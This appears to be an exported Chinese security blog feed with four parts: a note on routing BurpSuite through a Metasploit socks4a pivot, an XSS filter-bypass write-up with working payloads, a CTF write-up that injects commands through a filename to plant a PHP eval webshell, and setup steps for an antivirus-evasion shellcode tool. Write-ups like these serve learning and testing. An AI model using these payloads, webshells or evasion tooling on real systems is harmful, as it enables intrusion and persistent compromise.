<li>这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-33.png"></li>
</ol>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。</p>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址）<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-34.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-39.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-46-47.png"></li>
<li>burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-08.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-15.png"></li>
<li>打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-47-29.png"></li>
<li>回顾下出口流量走向，如下：<div id="flowchart-0" class="flow-chart"></div>

</li>
</ol>
<h4 id="为什么是25378端口"><a href="#为什么是25378端口" class="headerlink" title="为什么是25378端口"></a>为什么是25378端口</h4><ol>
<li>SockScap64支持系统代理<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-11.png"></li>
<li>启用系统代理可发现其使用25378端口做代理服务<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-50-27.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
e=>end: 目标网络
op1=>operation: burp代理（127.0.0.1:1080)
op2=>operation: SocksCap64本地代理（127.0.0.1:25378)
op3=>operation: ssh本地转发端口（127.0.0.1:1083)
op4=>operation: msf socks4a端口（172.16.1.2:11083）
st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script></li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次XSS绕过</title>
    <url>/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在某次演练中，发现了一处XSS注入点，位于<code>input</code>标签内，但是它拦截了大部分事件且拦截尖括号，并且标签内有<code>disable</code>，导致无法利用，本文记录一下绕过过程。</p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先简单看一下参数输出点，可以看到是在input标签内<br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-17-50.png"></p>
<p>简单测试，双引号不拦截，尖括号拦截<br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-10-55-37.png"><br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-10-56-25.png"><br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-10-57-13.png"></p>
<p>不能用尖括号的话，看来只能通过js事件触发了，fuzz了一下js事件，看到还是有几个事件还能用<br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-10-58-43.png"></p>
<p>事件用法可以参考<a href="https://www.runoob.com/tags/ref-eventattributes.html">HTML 事件属性</a></p>
<p><code>onshow</code>、<code>ontoggle</code>事件因为要<code>&lt;menu&gt; </code>元素或者<code>&lt;details&gt;</code>元素等才能触发，而本例是有拦截尖括号的，所以无法使用，而<code>oninvalid</code>事件需要在<code>&lt;form&gt;</code>内，而本例中的注入点恰好是在在<code>&lt;form&gt;</code>内，那么就选用<code>oninvalid</code>作为触发事件测试</p>
<p>先看一下<code>oninvalid</code>事件的触发样例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;wapFrom&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            查询号码：</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span>  <span class="attr">oninvalid</span>=<span class="string">&quot;alert(1)&quot;</span> /&gt;</span></span><br><span class="line">          </span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><code>oninvalid</code>事件会以正则表达式判断<code>pattern</code>属性的值，这里是<code>a</code>，那么当在input框输入的值不是全等于<code>a</code>的时候，并且被<code>submit</code>提交，就会触发<code>oninvalid</code>事件</p>
<p>本地保存以上代码为HTML文件，再使用浏览器打开。经过测试，随意输入字符串，点击提交后可以触发xss<br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-06-13.png"></p>
<h4 id="绕过事件拦截"><a href="#绕过事件拦截" class="headerlink" title="绕过事件拦截"></a>绕过事件拦截</h4><p>那么现在可以开始构造绕过payload了，因为需要<code>submit</code>提交，所以添加<code>type=&quot;submit&quot;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss&quot; oninvalid=console.log(1) pattern=&quot;a&quot; type=&quot;submit&quot; </span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-28-30.png"><br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-30-40.png"></p>
<h3 id="绕过disable属性"><a href="#绕过disable属性" class="headerlink" title="绕过disable属性"></a>绕过disable属性</h3><p>因为标签内有<code>disabled=&quot;disabled&quot;</code>，导致标签被禁用，所以需要屏蔽该元素，但是双斜杠<code>//</code>以及<code>&lt;!--</code>因为存在<code>&lt;</code>也被拦截，这里使用<code>a=</code>绕过，拼接后变成<code>a=&quot; disabled=&quot;disabled&quot;</code>，浏览器就会把<code>&quot; disabled=&quot;</code>当做属性<code>a</code>的值，从而绕过标签禁用，所以payload修改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss&quot; oninvalid=console.log(1) pattern=&quot;a&quot; type=&quot;submit&quot; a=</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-31-54.png"></p>
<h3 id="绕过js函数拦截"><a href="#绕过js函数拦截" class="headerlink" title="绕过js函数拦截"></a>绕过js函数拦截</h3><p>因为直接<code>oninvalid=alert(1)</code>会被拦截，使用变量绕过函数拦截，把<code>alert(1)</code>拆分为<code>a=alert;a(1)</code>进行绕过，最终payload为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">xss&quot; oninvalid=a=alert;a(1) pattern=&quot;a&quot; type=&quot;submit&quot; a=</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-40-27.png"><br><img data-src="/2021/03/24/%E8%AE%B0%E4%B8%80%E6%AC%A1XSS%E7%BB%95%E8%BF%87/2021-03-24-11-40-45.png"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文通过实际案例介绍了3个xss绕过小技巧，如有更好的方法，请各位师傅不吝赐教。</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>文章在t00ls发布后有师傅问道”input中 先是text然后submit 最后的input应该显示的还是text，图中的form中没有submit 最后是咋触发的…”，想了下这点确实没特地提出来，实际上xss插入的type即是text又是submit，保存以下代码为HTML可自行测试，在文本框中按回车即可触发。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">oninvalid</span>=<span class="string">a</span>=<span class="string">alert;a(1)</span> <span class="attr">pattern</span>=<span class="string">&quot;a&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">a</span>=<span class="string">&quot; disabled=&quot;</span><span class="attr">disabled</span>&quot; <span class="attr">style</span>=<span class="string">&quot;margin-top: 1px;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一道限制长度命令执行的CTF解题过程</title>
    <url>/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一道文件上传题，限制了上传内容长度小于15个字符，且校验文件头，上传文件拓展名采用黑名单限制，最终使用了一个巧妙的方法成功getshell。</p>
<a id="more"></a>
<h3 id="一顿操作拿flag"><a href="#一顿操作拿flag" class="headerlink" title="一顿操作拿flag"></a>一顿操作拿flag</h3><p>首先题目打开后页面如下，扫描了一下目录未发现其它文件<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-45-39.png"></p>
<p>上传一张图片，提示长度不能大于等于15<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-57-58.png"></p>
<p>然后把文件内容改短一点，可以看到是会校验文件内容的<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-59-42.png"></p>
<p>用常用的文件头可以绕过，如<code>GIF89A</code><br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-02-28.png"></p>
<p>然后再测测文件名，发现<code>php</code>后缀是会拦截<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-11-49-44.png"></p>
<p>简单测试发现是黑名单，那就简单的<code>pht/phtml</code>等多种拓展名可绕过<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-04-32.png"></p>
<p>因为限制了长度，所以使用<code>php短标签</code>，<code>php标签</code>不闭合也能执行，可以尽可能缩短内容长度<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-08-51.png"></p>
<p>然后根据返回的文件路径，访问文件，可以看到php代码确实执行了<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-10-08.png"></p>
<p>再想执行稍长一点的命令，发现已经超长了，所以接下来的问题就是缩短文件内容长度<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-13-08.png"></p>
<p>测试发现仅使用<code>GIF</code>作为文件头也能成功绕过文件头校验<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-14-54.png"></p>
<p>然后居然就这么看到疑似flag的东西，提交上去是对的？？？<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-16-20.png"></p>
<h3 id="进阶getshell"><a href="#进阶getshell" class="headerlink" title="进阶getshell"></a>进阶getshell</h3><p>看到这个flag我不禁陷入沉思，题目这么出有什么意思？？？这不是单纯恶心人么？？？</p>
<p>于是想是否还有其它方式能够绕过长度拦截，从而getshell呢？</p>
<p>既然文件内容长度是有限制的，但是文件名确没有限制，那么是否能通过控制文件名来执行想要的命令呢？</p>
<p>于是研究起linux命令，发现<code>sh -c *</code>可以让<strong>当前目录的文件名作为命令执行</strong></p>
<p>本地生成一个名为<code>whoami</code>的文件，使用<code>sh -c *</code>命令可以看到把文件名作为命令执行了<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-27-48.png"></p>
<p>因为<code>sh -c </code>本身就会把<code>-c</code>的值作为命令执行，<code>*</code>号统配符代表了当前目录所有的文件名，所以便执行成功<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-31-14.png"></p>
<p>根据这个思路，构造文件内容，发现长度超了，16位整好超一位<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-34-15.png"></p>
<p>于是测试其它文件头，发现<code>BM</code>可用<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-12-39-28.png"></p>
<p>接下来便是构造文件名了，我们既要文件名后缀为php可执行的<code>.pht</code>，又要执行命令，可用使用<code>;</code>号来分割命令，先试试<code>whoami;.pht</code>，通过<code>;</code>号分割后，即便后面的<code>.pht</code>不能正常执行也不影响前面的命令执行<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-12-42.png"></p>
<p>访问文件看到执行成功了<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-11-22.png"></p>
<p>然后就是写shell，因为要写到文件名所以把文件内容base64编码一下再通过重定向写入文件<code>1.pht</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d &gt;1.pht;.pht</span><br></pre></td></tr></table></figure>
<p><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-13-32.png"></p>
<p>发送上传包，成功写入这个畸形的文件名及内容<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-19-39.png"></p>
<p>接下来要访问一下，才能让它执行并生成<code>1.pht</code>，这里需要把空格URL编码，然后200访问成功<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-21-11.png"></p>
<p>再访问一下上传命令的<code>1.pht</code>，200访问成功<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-22-08.png"></p>
<p>然后就拿个webshell连接工具就行了，这里用的是蚁剑<br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-23-49.png"><br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-24-50.png"><br><img data-src="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/2021-07-18-13-25-17.png"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文介绍了一种限制上传文件内容长度的绕过思路，如有雷同，纯粹巧合。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>记免杀工具BypassAv-web的安装过程</title>
    <url>/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近期在GitHub看到nim一键免杀的项目，遂想测试一下，但是作者并没有提供部署教程，在踩了很多坑之后安装成功。</p>
<p><a href="https://github.com/M-Kings/BypassAv-web">https://github.com/M-Kings/BypassAv-web</a></p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702144207093.png"></p>
<a id="more"></a>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>本节是安装步骤的记录，如果仅是想安装部署项目可参考本节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root</span><br><span class="line"># 下载代码库</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;M-Kings&#x2F;BypassAv-web.git</span><br><span class="line"></span><br><span class="line"># 起个Ubuntu的docker</span><br><span class="line">docker run -itd -p 8001:8000 -v &#x2F;root&#x2F;BypassAv-web&#x2F;:&#x2F;root&#x2F;BypassAv-web&#x2F; ubuntu</span><br><span class="line"></span><br><span class="line"># 进入docker容器，这里的4d是容器id，每次启动容器示例不一样，自己docker ps看一下</span><br><span class="line">docker exec -it 4d bash</span><br><span class="line"></span><br><span class="line"># 安装必备组件</span><br><span class="line">apt update</span><br><span class="line">apt install python3 python3-pip nim vim wget unzip mingw-w64</span><br><span class="line"></span><br><span class="line"># 进入代码所在目录</span><br><span class="line">cd &#x2F;root&#x2F;BypassAv-web&#x2F;</span><br><span class="line"># 创建两个必备目录，作者代码里并没有自动创建</span><br><span class="line">mkdir files</span><br><span class="line">mkdir temp</span><br><span class="line"></span><br><span class="line"># 作者代码里写了绝对路径，所以要去改一下</span><br><span class="line"># nim&#x2F;views.py 84行</span><br><span class="line">vim nim&#x2F;views.py</span><br><span class="line">原代码：</span><br><span class="line">yesxor &#x3D; os.popen(&#39;&#x2F;root&#x2F;FileService&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">修改为:</span><br><span class="line">yesxor &#x3D; os.popen(os.path.abspath(os.curdir) + &#39;&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">os.path.abspath(os.curdir)</span><br><span class="line"></span><br><span class="line"># 代码内调用该文件，需要赋予执行权限</span><br><span class="line">chmod 755 code&#x2F;testnim</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 安装nim的依赖库</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br><span class="line"></span><br><span class="line"># 回到主目录</span><br><span class="line">cd ..</span><br><span class="line">python3 manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<h3 id="排错过程"><a href="#排错过程" class="headerlink" title="排错过程"></a>排错过程</h3><p>本节是排错过程，如果有兴趣了解我是如何发现并解决安装过程出现的问题的，敬请阅读。</p>
<h4 id="目录不存在的报错"><a href="#目录不存在的报错" class="headerlink" title="目录不存在的报错"></a>目录不存在的报错</h4><p>这个问题手动创建文件夹即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir files</span><br><span class="line">mkdir temp</span><br></pre></td></tr></table></figure>

<h4 id="文件不存在报错"><a href="#文件不存在报错" class="headerlink" title="文件不存在报错"></a>文件不存在报错</h4><p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142637535.png"></p>
<p>查看代码，把输出打开，并把移除文件的代码注释掉，这样我们就可以手动调试生成的文件</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142258634.png"></p>
<p>根据后端的报错，发现作者应该是有一处代码写了绝对路径，所以查找关键字发现view.py 84行处写了绝对路径</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702142924309.png"></p>
<p>然后简单修改为相对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># view 84行</span><br><span class="line">vim nim&#x2F;views.py</span><br><span class="line">yesxor &#x3D; os.popen(&#39;&#x2F;root&#x2F;FileService&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">yesxor &#x3D; os.popen(os.path.abspath(os.curdir) + &#39;&#x2F;code&#x2F;testnim &#39;+shellcode).read()</span><br><span class="line">os.path.abspath(os.curdir)</span><br></pre></td></tr></table></figure>

<p>解决了上述问题，发现web端还是会报错，无法下载文件</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702111813948.png"></p>
<p>本地执行nim编译命令，发现有报错</p>
<p><img data-src="/2021/07/02/%E8%AE%B0%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7BypassAv-web%E7%9A%84%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/image-20210702143347018.png"></p>
<p>Google一番发现是nim编译时需要调用mingw32</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install mingw-w64</span><br></pre></td></tr></table></figure>

<p>然后再次编译发生如下错误</p>
